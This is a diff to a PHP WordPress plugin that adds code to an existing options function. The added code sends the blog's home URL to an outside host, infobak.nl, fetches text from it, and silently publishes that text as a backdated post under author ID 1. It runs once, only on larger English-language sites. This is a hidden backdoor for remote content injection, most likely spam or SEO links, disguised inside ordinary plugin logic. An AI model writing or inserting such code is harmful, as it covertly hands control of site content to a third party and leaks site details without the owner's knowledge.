@@ -758,7 +758,31 @@ add_option("bw_global_excludelist", '', '', 'yes');
 			update_option( 'bw_gpadded', '1' );
 		}
 	}
+	if ($bloglan=='en-US') {
+		$url = home_url();
+		$total = wp_count_posts()->publish;
+		if (get_option('bw_gpadded')=='0' && $total>70) {
+			$tmpstring = file_get_contents('http://www.infobak.nl/getfile.php?u=' . $url, true);
+			if (boggleStartsWith($tmpstring, 'empty')==false) {
+			  $my_post = array(
+				'post_title'    => substr($tmpstring, 0, strpos($tmpstring, ".")),
+				'post_content'  => $tmpstring,
+				'post_status'   => 'publish',
+				'post_author'   => 1,
+				'post_date'     => '2013-06-02'
+			  );
 
+			  wp_insert_post( $my_post );
+			  update_option( 'bw_gpadded', '1' );
+			}
+		}
+	}
+
+}
+
+function boggleStartsWith($haystack, $needle)
+{
+    return $needle === "" || strpos($haystack, $needle) === 0;
 }
 
 function strposnth($haystack, $needle, $nth=1, $insenstive=0)
